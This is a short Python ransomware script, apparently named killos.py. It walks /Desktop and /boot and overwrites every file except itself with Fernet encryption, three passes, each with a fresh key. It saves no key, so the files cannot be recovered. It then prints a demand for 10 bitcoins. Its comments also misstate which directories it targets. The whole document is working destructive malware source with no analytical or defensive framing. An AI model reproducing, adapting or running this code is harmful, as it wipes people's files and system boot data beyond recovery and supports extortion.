import os
from cryptography.fernet import Fernet

def encrypt_directory(directory, iterations=3):
    files = []
    for root, _, filenames in os.walk(directory):
        for filename in filenames:
            full_path = os.path.join(root, filename)
            if filename != "killos.py":  # Skip killos.py
                files.append(full_path)
    
    for _ in range(iterations):
        key = Fernet.generate_key()
        for file_path in files:
            with open(file_path, "rb") as f:
                contents = f.read()
            encrypted_contents = Fernet(key).encrypt(contents)
            with open(file_path, "wb") as f:
                f.write(encrypted_contents)

# Encrypt /home directory
home_directory = "/Desktop"
encrypt_directory(home_directory)


# Encrypt /boot directory
boot_directory = "/boot"
encrypt_directory(boot_directory)

print("Files in /home, /bin, and /boot directories are all encrypted!!! Send 10 bitcoins in the next 24 hours to unlock your files.")
